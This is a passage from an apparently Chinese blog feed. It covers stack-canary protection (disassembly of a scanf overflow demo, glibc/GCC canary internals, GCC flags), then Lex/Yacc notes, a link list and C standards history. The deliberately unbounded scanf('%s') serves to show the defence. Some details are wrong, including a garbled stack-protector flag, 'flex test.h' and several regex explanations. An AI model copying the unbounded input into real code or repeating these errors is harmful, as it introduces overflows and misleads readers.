scanf(&quot;%s&quot;,arry);<br>    1184:       48 8d 45 ee             lea    -0x12(%rbp),%rax<br>    1188:       48 89 c6                mov    %rax,%rsi<br>    118b:       48 8d 05 72 0e 00 00    lea    0xe72(%rip),%rax        # 2004 &lt;_IO_stdin_used+0x4&gt;<br>    1192:       48 89 c7                mov    %rax,%rdi<br>    1195:       b8 00 00 00 00          mov    $0x0,%eax<br>    119a:       e8 d1 fe ff ff          call   1070 &lt;__isoc99_scanf@plt&gt;<br><br>    return 0;<br>    119f:       b8 00 00 00 00          mov    $0x0,%eax<br>&#125;<br>    11a4:       48 8b 55 f8             mov    -0x8(%rbp),%rdx<br>    11a8:       64 48 2b 14 25 28 00    sub    %fs:0x28,%rdx<br>    11af:       00 00<br>    11b1:       74 05                   je     11b8 &lt;main+0x4f&gt;<br>    11b3:       e8 a8 fe ff ff          call   1060 &lt;__stack_chk_fail@plt&gt;<br>    11b8:       c9                      leave<br>    11b9:       c3                      ret<br><br>Disassembly of section .fini:<br><br>00000000000011bc &lt;_fini&gt;:<br>    11bc:       f3 0f 1e fa             endbr64<br>    11c0:       48 83 ec 08             sub    $0x8,%rsp<br>    11c4:       48 83 c4 08             add    $0x8,%rsp<br>    11c8:       c3                      ret<br></code></pre></td></tr></table></figure><p>在开启了栈保护之后，我们如果输入超过10字节的内容会发生什么？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ter">*** stack smashing detected ***: terminated<br></code></pre></td></tr></table></figure><p>可以看到有东西阻止了错误。如果没有使用保护机制的话就会直接发生<strong>段错误</strong>。</p><h2 id="分析二进制代码"><a href="#分析二进制代码" class="headerlink" title="分析二进制代码"></a>分析二进制代码</h2><p>现在我们查看<code>main</code>函数的二进制代码，可以看到<code>mov    %fs:0x28,%rax</code>这样一句话。在Linux中，fs寄存器被用于存放线程局部存储（Thread Local Storage, TLS），TLS主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。TLS为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其他线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度看，就好像一个全局变量被克隆成了多份副本，每一份副本都可以被一个线程独立地改变。在glibc的实现里，TLS结构体tcbhead_t的定义如下所示，偏移0x28的地方正是stack_guard。</p><p>Ⅰ. Glibc中</p><p>1.内核提供的随机数生成器_dl_random产生随机数</p><p>2.函数_dl_setup_stack_chk_guard根据系统是32位还是64位将随机数处理成4byte或8byte的canary，并赋给变量__stack_chk_guard</p><p>3.宏THREAD_SET_STACK_GUARD通过处理将变量__stack_chk_guard放入结构体tcbhead_t的成员stack_guard中（即fs:28h）</p><p>Ⅱ. GCC中</p><p>4.选择canary的插入位置, 以及引入与canary有关的汇编代码</p><p>Ⅲ. 程序运行中</p><p>5.程序函数开头从 fs:28h 中取出8字节的值插入到栈中，同时清空rax中的副本</p><p>6.函数结束时，程序会再次从 fs:28h 中将canary的值取出与栈上的canary进行比较</p><p>7.如果canary不同则跳到函数 ___stack_chk_fail 直接终止程序，否则继续执行程序</p><h1 id="gcc中的安全选项"><a href="#gcc中的安全选项" class="headerlink" title="gcc中的安全选项"></a>gcc中的安全选项</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">-Wstack-protector <span class="hljs-comment"># 对于alloca系列函数和内部缓冲区大于8字节的函数开启保护</span><br>-fstack-protector-strong <span class="hljs-comment"># 增强对包含局部数组定义和地址引用的函数的保护</span><br>-fstack-protector-all <span class="hljs-comment"># 对所有函数开启保护</span><br><br>-fstack-protector-explicit <span class="hljs-comment"># 对于包含stack_protect属性的函数开启保护</span><br>-fon-fstack-protector <span class="hljs-comment"># 关闭金丝雀保护，为默认情况</span><br></code></pre></td></tr></table></figure><h1 id="控制流保护"><a href="#控制流保护" class="headerlink" title="控制流保护"></a>控制流保护</h1><p>有时我们在反汇编的时候会看到<code>endbr64</code>这样一条指令，这条指令就是控制流保护指令，防止攻击者对于控制流的劫持。需要注意的是，<code>endbr64</code>指令通常是由编译器在生成代码时自动插入的，而不是由程序员直接编写的。这是因为它是与控制流保护相关的低级指令，通常不需要直接操作。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p><a href="https://zhakul.top/2019/03/19/Glibc%E4%B8%ADcanary%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://zhakul.top/2019/03/19/Glibc%E4%B8%ADcanary%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p></li><li><p><a href="https://kiprey.github.io/2022/08/thread_canary/#4-TCB-%E4%BD%8D%E7%BD%AE">https://kiprey.github.io/2022/08/thread_canary/#4-TCB-%E4%BD%8D%E7%BD%AE</a></p></li><li><p><a href="https://firmianay.gitbook.io/ctf-all-in-one/2_tools/dong-tai-fen-xi-gong-ju/2.3.1_gdb#gdb-peda">https://firmianay.gitbook.io/ctf-all-in-one/2_tools/dong-tai-fen-xi-gong-ju/2.3.1_gdb#gdb-peda</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于Lex和Yacc</title>
    <link href="/2023/12/30/%E5%85%B3%E4%BA%8ELex%E5%92%8CYacc/"/>
    <url>/2023/12/30/%E5%85%B3%E4%BA%8ELex%E5%92%8CYacc/</url>
    
    <content type="html"><![CDATA[<p>关于Lex和Yacc知识点总结</p><span id="more"></span><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>我们知道编译器有一下的执行步骤：<br>词法分析、语法分析、语义分析、IR（中间代码，intermediate Representation）产生、IR优化、代码产生、最终优化。</p><p>实际上就是<br>词法分析-&gt;语义分析-&gt;生成中间代码-&gt;代码生成</p><p>词法分析的核心是识别源代码，将其划分为一个个的token。lex就是这样一套框架，由用户提供规则，然后lex按照这个规则对文本进行分析。然后输出以C语言编写的词法分析器源代码。</p><p>Yacc的作用是生成一个语义解析器，其可以在没有分析器时使用，但是，完整的语法分析通常需要外部词法分析器首先执行标记化阶段（单词分析），然后才是解析阶段。</p><p>所以Yacc一般和Lex一同使用。</p><h1 id="Lex语法"><a href="#Lex语法" class="headerlink" title="Lex语法"></a>Lex语法</h1><p>Lex的语法主要包括三部分：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;定义&gt;<br><br>%%<br><br>&lt;规则&gt;<br><br>%%<br><br>&lt;代码&gt;<br><br></code></pre></td></tr></table></figure><p>其中只有<strong>规则</strong>是<strong>必须</strong>的，其他的两个段都是可选的。</p><h2 id="定义段"><a href="#定义段" class="headerlink" title="定义段"></a>定义段</h2><p>定义段主要包括的是：</p><ul><li>C代码定义</li><li>指令定义</li><li>命令正则表达式定义</li></ul><h3 id="C代码定义的格式"><a href="#C代码定义的格式" class="headerlink" title="C代码定义的格式"></a>C代码定义的格式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">%&#123;<br>codes<br>&#125;%<br></code></pre></td></tr></table></figure><p>在 <code>%&#123;</code> 和 <code>%&#125;</code> 之间定义 C 代码，lex 会将这些代码直接拷贝至输出文件中。一般会在这里定义变量，include 语句等。</p><h3 id="指令定义"><a href="#指令定义" class="headerlink" title="指令定义"></a>指令定义</h3><p>指令定义则是通过 <code>lex</code> 提供的一系列以<code>%</code>开头的指令来修改内置变量的默认值。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Lex">%array：将内置的 yytext 变量的类型设置为 char 数组类型。<br><br>%pointer：将内置的 yytext 标量的类型设置为 char 数组指针类型。<br><br>%s STATE：定义一个 STATE 状态，STATE 可以是任意字符串。lex 默认以 INITIAL 作为初始状态。<br><br>%e size：定义内置的 NFA 表项的数量。默认值是 1000。<br><br>%n size：定义内置的 DFA 表项的数量。默认值是 500。<br><br>%p size：定义内置的 move 表项的数量。默认值是 2500。<br></code></pre></td></tr></table></figure><h3 id="命名正则表达式的格式"><a href="#命名正则表达式的格式" class="headerlink" title="命名正则表达式的格式"></a>命名正则表达式的格式</h3><p>命名正则表达式定义为一系列命名的正则表达式，用于描述不同的标识符，如：<code>function</code>、<code>let</code>、<code>import</code>，其基本格式如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">name expression<br></code></pre></td></tr></table></figure><p>注意<code>name</code>和<code>expression</code>之间需要用空格隔开<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Lex">letter   [a-zA-Z]<br>digit    [0-9]<br>punct    [,.:;!?]<br>nonblank [^ \t]<br>name     &#123;letter&#125;(&#123;letter&#125;│&#123;digit&#125;)<br></code></pre></td></tr></table></figure><h2 id="规则段"><a href="#规则段" class="headerlink" title="规则段"></a>规则段</h2><p>规则部分定义了一系列的 词法翻译规则（Lexical Translation Rules），每一条词法翻译规则可以分为两部分：<strong>模式</strong> 和 <strong>动作</strong>。</p><p>模式：用于描述词法规则的正则表达式<br>动作：模式匹配时要执行的 C 代码<br>词法翻译规则的基本格式如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lex">pattern action<br>// or<br>pattern &#123;<br>    action<br>&#125;<br></code></pre></td></tr></table></figure><p>当词法翻译规则的模式匹配成功时，lex 默认会将匹配的 token 值存储在 <code>yytext</code> 变量，将匹配的 token 长度存储在 <code>yyleng</code> 变量。</p><h3 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h3><p>如果词法翻译规则的模式的匹配依赖上下文，那么我们可以有不同的方式来处理。我们可以根据其所依赖上下文的相对位置，分为：左状态（Left State） 和 右状态（Right State）两种。</p><h4 id="左状态"><a href="#左状态" class="headerlink" title="左状态"></a>左状态</h4><p>左状态的基本格式如下所示：</p><p><code>&lt;STATE&gt;(pattern) &#123; action; BEGIN OTHERSTATE; &#125;</code></p><p>其中 <code>STATE</code> 为定义部分的状态定义所定义的状态，使用 <code>%s STATE</code> 进行定义。</p><h4 id="右状态"><a href="#右状态" class="headerlink" title="右状态"></a>右状态</h4><p>右状态的基本格式如下所示：</p><p><code>pattern/context &#123;action&#125;</code></p><p>当匹配到 <code>pattern</code> 时，且紧随其后是 <code>context</code>，那么才算匹配成功。在这种情况下，&#x2F; 后面的内容仍然位于输入流中，它们可以作为下一个匹配的输入。</p><p>示例:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex"><br></code></pre></td></tr></table></figure><h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><p>首先看一个例子，其实现了输出文本的字符数、单词数、行数。<br><code>test.l</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs lex">/* 第一段 */ <br>%&#123;<br>    int chars = 0;<br>    int words = 0;<br>    int lines = 0;<br>%&#125;<br><br>/* 第二段 */  <br>%%<br>[a-zA-Z]+  &#123; words++; chars += strlen(yytext); &#125;<br>\n         &#123; chars++; lines++; &#125;<br>.          &#123; chars++; &#125;<br>%%<br><br>/* 第三段 */  <br>main(int argc, char **argv)<br>&#123;<br>    yylex();<br>    printf(&quot;%8d%8d%8d\n&quot;, lines, words, chars);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们看到这个程序被分为了三段，其中第一段是全局变量的定义，第二段是规则段（如何处理文本），第三段是c代码段。</p><h2 id="如何编译"><a href="#如何编译" class="headerlink" title="如何编译"></a>如何编译</h2><p>编写了<code>test.l</code>文件后我们使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">flex test.h <span class="hljs-comment">#生成lex.yy.c文件，这个文件是一个c文件。</span><br><br>gcc lex.yy.c -lfl <span class="hljs-comment">#这里需要加上-lfl，否则无法通过编译，如果想要直接编译而不加-lfl则需要在test.l文件的第三段加上：</span><br>int <span class="hljs-function"><span class="hljs-title">yywrap</span></span>()<br>&#123;<br>        <span class="hljs-built_in">return</span> 1;<br>&#125;<br><span class="hljs-comment">#这个函数就可以直接编译了。</span><br></code></pre></td></tr></table></figure><h2 id="Lex自定义的变量"><a href="#Lex自定义的变量" class="headerlink" title="Lex自定义的变量"></a>Lex自定义的变量</h2><p> <strong>Lex 变量</strong></p><table><thead><tr><th>yyin</th><th>FILE* 类型。 它指向 lexer 正在解析的当前文件。</th></tr></thead><tbody><tr><td>yyout</td><td>FILE* 类型。 它指向记录 lexer 输出的位置。 缺省情况下，yyin 和 yyout 都指向标准输入和输出。</td></tr><tr><td>yytext</td><td>匹配模式的文本存储在这一变量中（char*）。</td></tr><tr><td>yyleng</td><td>给出匹配模式的长度。</td></tr><tr><td>yylineno</td><td>提供当前的行数信息。 （lexer不一定支持。）</td></tr></tbody></table><p> <strong>Lex 函数</strong></p><table><thead><tr><th>yylex()</th><th>这一函数开始分析。 它由 Lex 自动生成。</th></tr></thead><tbody><tr><td>yywrap()</td><td>这一函数在文件（或输入）的末尾调用。 如果函数的返回值是1，就停止解析。 因此它可以用来解析多个文件。 代码可以写在第三段，这就能够解析多个文件。 方法是使用 yyin 文件指针（见上表）指向不同的文件，直到所有的文件都被解析。 最后，yywrap() 可以返回 1 来表示解析的结束。</td></tr><tr><td>yyless(int n)</td><td>这一函数可以用来送回除了前�n? 个字符外的所有读出标记。</td></tr><tr><td>yymore()</td><td>这一函数告诉 Lexer 将下一个标记附加到当前标记后。</td></tr></tbody></table><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401062210895.png"></p><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td>A-Z, 0-9, a-z</td><td>构成了部分模式的字符和数字。</td></tr><tr><td>.</td><td>匹配任意字符，除了 \n。</td></tr><tr><td>-</td><td>用来指定范围。例如：A-Z 指从 A 到 Z 之间的所有字符。</td></tr><tr><td>[ ]</td><td>一个字符集合。匹配括号内的 任意 字符。如果第一个字符是 ^ 那么它表示否定模式。例如: [abC] 匹配 a, b, 和 C中的任何一个。</td></tr><tr><td>*</td><td>匹配 0个或者多个上述的模式。</td></tr><tr><td>+</td><td>匹配 1个或者多个上述模式。</td></tr><tr><td>?</td><td>匹配 0个或1个上述模式。</td></tr><tr><td>$</td><td>作为模式的最后一个字符匹配一行的结尾。</td></tr><tr><td>{ }</td><td>指出一个模式可能出现的次数。 例如: A{1,3} 表示 A 可能出现1次或3次。</td></tr><tr><td>\</td><td>用来转义元字符。同样用来覆盖字符在此表中定义的特殊意义，只取字符的本意。</td></tr><tr><td>^</td><td>否定。除开</td></tr><tr><td>|</td><td>表达式间的逻辑或。</td></tr><tr><td>“&lt;一些符号&gt;”</td><td>字符的字面含义。元字符具有。</td></tr><tr><td>&#x2F;</td><td>向前匹配。如果在匹配的模版中的“&#x2F;”后跟有后续表达式，只匹配模版中“&#x2F;”前 面的部分。如：如果输入 A01，那么在模版 A0&#x2F;1 中的 A0 是匹配的。</td></tr><tr><td>( )</td><td>将一系列常规表达式分组。</td></tr></tbody></table><p>方括号中只保留两个操作，连字号（ “­-” ）和抑扬号（ “^” ）。当把连<br>字号用于两个字符中间时，表示字符的范围。当把抑扬号用在开始位置时，表示对后面的表达式取 反。如果两个范式匹配相同的字符串，就会使用匹配长度最长的范式。如果两者匹配的长度相同， 就会选用第一个列出的范式。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401062212012.png"></p><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><table><thead><tr><th>常规表达式</th><th>含义</th></tr></thead><tbody><tr><td>joke[rs]</td><td>匹配 jokes 或 joker。</td></tr><tr><td>A{1,2}shis+</td><td>匹配 AAshis, Ashis, AAshi, Ashi。</td></tr><tr><td>(A[b-e])+</td><td>匹配在 A 出现位置后跟随的从 b 到 e 的所有字符中的 0 个或 1个。</td></tr></tbody></table><h2 id="标记申明举例"><a href="#标记申明举例" class="headerlink" title="标记申明举例"></a>标记申明举例</h2><table><thead><tr><th>标记</th><th>相关表达式</th><th>含义</th></tr></thead><tbody><tr><td>数字(number)</td><td>([0-9])+</td><td>1个或多个数字</td></tr><tr><td>字符(chars)</td><td>[A-Za-z]</td><td>任意字符</td></tr><tr><td>空格(blank)</td><td>“ “</td><td>一个空格</td></tr><tr><td>字(word)</td><td>(chars)+</td><td>1个或多个 chars</td></tr><tr><td>变量(variable)</td><td>(字符)+(数字)*(字符)*(数字)*</td><td></td></tr></tbody></table><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www2.cs.arizona.edu/~debray/Teaching/CSc453/DOCS/tutorial-large.pdf">https://www2.cs.arizona.edu/~debray/Teaching/CSc453/DOCS/tutorial-large.pdf</a></p><p><a href="http://chuquan.me/2022/06/22/compiler-principle-tool-lex/">http://chuquan.me/2022/06/22/compiler-principle-tool-lex/</a></p><h1 id="YACC"><a href="#YACC" class="headerlink" title="YACC"></a>YACC</h1><p>词法分析器生成器 lex，现在我们来介绍语法&#x2F;语义分析器生成器 yacc。</p><p>在编译流程中，词法分析器会扫描代码文件，并将其 token 化。语法&#x2F;语义分析器则会扫描 token 化后的内容，从而建立语法树，生成语义信息。</p><p>下面，我们简单介绍一下 yacc 的工作原理和基本用法。</p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>lex 和 yacc 分别使用各自的描述文件生成词法分析器 yylex() 和语法&#x2F;语义分析器 yyparse()。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401062221294.png"></p><p><code>yyparse()</code> 自身并不进行词法分析，而是调用 <code>yylex()</code> 进行词法分析。<code>yylex()</code> 返回一个 <code>token</code> 号，表示 <code>token</code> 的类型。<code>token</code> 值则存储在 <code>yylval</code> 变量中。比如：<code>token</code> 的类型为 算术运算符，<code>token</code> 的值为 +。<code>yyparse()</code> 则通过读取 <code>yylex()</code> 的返回值以及 <code>yylval</code> 变量分别获取 <code>token</code> 类型和 <code>token</code> 值。</p><p>yyparse() 函数的返回值有两种：</p><p>当返回值为 0 时，表示解析正确<br>当返回值为 1 时，表示解析错误</p><h2 id="描述文件"><a href="#描述文件" class="headerlink" title="描述文件"></a>描述文件</h2><p>yacc的描述文件的基本格式和lex一致:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gcode">定义<br><br><span class="hljs-meta">%</span><span class="hljs-meta">%</span> <br><br>规则<br><br><span class="hljs-meta">%</span><span class="hljs-meta">%</span> <br><br>代码<br><br></code></pre></td></tr></table></figure><p>除开规则是必须要的,其他两个都是可选的.</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>定义部分也是被分为了三部分:</p><ul><li>token定义</li><li>优先级和关联性定义</li><li>变量和函数定义:方便后面的语法分析</li></ul>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用的知识点网站</title>
    <link href="/2023/12/30/%E5%B8%B8%E7%94%A8%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9%E7%BD%91%E7%AB%99/"/>
    <url>/2023/12/30/%E5%B8%B8%E7%94%A8%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9%E7%BD%91%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<p>记载一些现在没有用到，但是之后可能会用的网页</p><span id="more"></span><p><a href="https://github.com/ruanyf/weekly/issues/3804">如何删除edge</a></p><p><a href="https://zh.cppreference.com/w/c/links/libs">开源C库</a></p><p><a href="https://zh.cppreference.com/w/c/links">有用的C语言官方资料1</a></p><p><a href="https://github.com/clibs/clib/wiki">C包管理</a></p><p><a href="https://docs.conan.io/1/using_packages.html">C&#x2F;C++包管理</a></p><p><a href="https://explainshell.com/#">解释每一条shell指令</a></p><p><a href="https://cdecl.org/">解释C语言中的胡言乱语(char (*(*x[3])())[5])</a></p><p><a href="https://command-not-found.com/">输入命令告诉你在对应的平台上如何下载</a></p><p><a href="https://blog.arg.pub/2022/01/19/algorithm/%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6/#more">算法复杂度的计算1</a></p><p><a href="https://blog.arg.pub/2022/03/02/algorithm/%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6%E4%B9%8B%E6%91%8A%E8%BF%98%E5%88%86%E6%9E%90/">算法复杂度的计算1</a></p><h1 id="非链接"><a href="#非链接" class="headerlink" title="非链接"></a>非链接</h1><p>汇总一下内核调试的几种 trace 工具（底层主要依赖 kprobe 和 ftrace）：   </p><p>systemtap(链接)<br>bpftrace(链接)<br>bcc-tools(链接)<br>bpf-perf-tools-book(链接)<br>perf-tools(链接)   </p><h1 id="嵌入式"><a href="#嵌入式" class="headerlink" title="嵌入式"></a>嵌入式</h1><ul><li><a href="https://openwrt.org/">嵌入式操作系统架构</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
      <category>问题总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c语言标准的研究</title>
    <link href="/2023/12/29/c22%E3%80%81c11%E3%80%81c99%E4%B9%8B%E9%97%B4%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
    <url>/2023/12/29/c22%E3%80%81c11%E3%80%81c99%E4%B9%8B%E9%97%B4%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<p>总结各主要c标准之间的关系和C语言的知识点</p><span id="more"></span><hr><h1 id="C语言的历史"><a href="#C语言的历史" class="headerlink" title="C语言的历史"></a>C语言的历史</h1><p>作为编程语言<code>B</code>的后继者，<code>C </code>最初由 Dennis Ritchie与 Ken Thompson在 1972 年至 1973 年间在贝尔实验室开发，用于构建在 Unix 上运行的实用程序。它被应用于重新实现Unix操作系统的内核。20世纪80年代，C逐渐流行起来。它已成为使用最广泛的编程语言之一，其 C 编译器可用于几乎所有现代计算机体系结构和操作系统。</p><p><a href="https://www.bell-labs.com/usr/dmr/www/chist.html">具体的历史</a></p><h1 id="c标准历史"><a href="#c标准历史" class="headerlink" title="c标准历史"></a>c标准历史</h1><h2 id="C89、ANSIC、C90"><a href="#C89、ANSIC、C90" class="headerlink" title="C89、ANSIC、C90"></a>C89、ANSIC、C90</h2><p>C语言的第一个标准是<code>1989</code>年完成的ANSI X3.159-1989 “Programming Language C”。称之为<code>C89</code>。由于这个标注由<code>ANSI</code>美国国家标准协会制定，所以又称之为<code>ANSIC</code>。</p><p>在1990年，ANSI C标准（带有一些小改动）被国际标准化组织采纳为ISO&#x2F;IEC 9899:1990，这个版本有时候称为<code>C90</code>。<strong>因此，<code>C89</code>和<code>C90</code>通常指同一种语言。</strong></p><p>所以这三种标准实际上是同一种标准的不同叫法。</p><p><strong>需要注意的是<code>K&amp;R C</code>。1978 年，Brian Kernighan 和 Dennis Ritchie 出版了第一版《C 编程语言》。这本书以其作者名字的首字母缩写为 K&amp;R，多年来一直作为该语言的非正式规范。它描述的 C 版本通常称为“K&amp;R C”。由于该产品于 1978 年发布，因此也被称为 C78。本书的第二版涵盖了后来的ANSI C标准，如下所述。</strong></p><p>所以<code>K&amp;R C</code>其实并不是严格意义上的标准，虽然有很多人将其视为最初的C语言标准。</p><h2 id="C99"><a href="#C99" class="headerlink" title="C99"></a>C99</h2><p>在2000年三月，ANSI采纳了ISO&#x2F;IEC 9899:1999标准。这个标准通常指C99。</p><h2 id="C11"><a href="#C11" class="headerlink" title="C11"></a>C11</h2><p>在2011年12月，ANSI采纳了ISO&#x2F;IEC 9899:2011标准。这个标准通常即C11。</p><h2 id="C17"><a href="#C17" class="headerlink" title="C17"></a>C17</h2><p>C17 于 2018 年 6 月作为 ISO&#x2F;IEC 9899:2018 发布，是 C 编程语言的当前标准。<strong>它没有引入新的语言功能</strong>，仅引入技术更正以及对 C11 中的缺陷的澄清。<strong>需要注意的是该标准也被称之为<code>C18</code>，这是因为它于2017年编写并于2018年6月发布。</strong>但是官方的称呼是<code>C17</code>而不是<code>C18</code>。</p><h2 id="C23"><a href="#C23" class="headerlink" title="C23"></a>C23</h2><p>C23 是下一个（C17 之后）主要 C 语言标准修订版的非正式名称。预计将于 2024 年发布。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过以上的描述，我们可以知道c标准发展线：<br><code>K&amp;R C</code>(非正式标准)-&gt;<code>C89</code>(<code>ANSI C</code> <code>C90</code>)-&gt;<code>C99</code>-&gt;<code>C11</code>-&gt;<code>C17</code>(<code>C18</code>)-&gt;<code>C23</code></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312300021379.png"></p><p>自从<code>C11</code>以来与下一次的C标准之间的时间间隔都是6年。</p><hr><h1 id="具体的标准"><a href="#具体的标准" class="headerlink" title="具体的标准"></a>具体的标准</h1><h1 id="C89"><a href="#C89" class="headerlink" title="C89"></a>C89</h1><p>这一代的标准是第一次严格意义上的C标准，其是<code>K&amp;R C</code>的超集。添加了：函数原型（借自 C++）、 void 指针、对国际字符集和语言环境的支持以及预处理器增强。尽管参数声明的语法得到了扩展以包括 C++ 中使用的样式，但为了与现有源代码兼容，K&amp;R 接口仍然被允许。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312300058299.png" alt="C89中的关键字"></p><h1 id="c99"><a href="#c99" class="headerlink" title="c99"></a>c99</h1><p><code>c99</code>是1999年发布的C语言标准，所以称之为<code>c99</code>。<code>c99</code>是在<code>c89</code>的基础上进行的改善。</p><h2 id="关键字的变化"><a href="#关键字的变化" class="headerlink" title="关键字的变化"></a>关键字的变化</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312300059578.png" alt="C99中的关键字"></p><p>其引入了一些新的关键字：</p><ul><li>内联函数<code>inline</code></li><li>指针限定<code>restrict</code></li><li>布尔类型<code>_Bool</code></li><li>虚数类型<code>_Imaginary</code></li><li>复数类型<code>_Complex</code></li></ul><h1 id="C11-1"><a href="#C11-1" class="headerlink" title="C11"></a>C11</h1><h2 id="关键字的变化-1"><a href="#关键字的变化-1" class="headerlink" title="关键字的变化"></a>关键字的变化</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312300102915.png" alt="C11中的关键字"></p><p>其中引入的新关键字：</p><ul><li><code>_Alignas</code></li><li><code>_Alignof</code></li><li><code>_Atomic</code></li><li><code>_Generic</code></li><li><code>_Noreturn</code></li><li><code>_Starct_assert</code></li><li><code>_Thread_loacl</code></li></ul><h1 id="C17-1"><a href="#C17-1" class="headerlink" title="C17"></a>C17</h1><h2 id="关键字的变化-2"><a href="#关键字的变化-2" class="headerlink" title="关键字的变化"></a>关键字的变化</h2><p>C17没有添加新的关键字。</p><p>本文记录一下C&#x2F;C++标准版本，以及不同版本的新特性。其中:</p><ul><li><p>C语言: C89&#x2F;90、C95、C99、C11、C17</p></li><li><p>C++语言: C++98、C++03、C++11、C++14、C++17、C++20</p></li></ul><h2 id="1-发行标准"><a href="#1-发行标准" class="headerlink" title="1. 发行标准"></a>1. 发行标准</h2><h3 id="1-1-C语言标准"><a href="#1-1-C语言标准" class="headerlink" title="1.1 C语言标准"></a>1.1 C语言标准</h3><ul><li><p>C89 (ANSI X3.159-1989)： 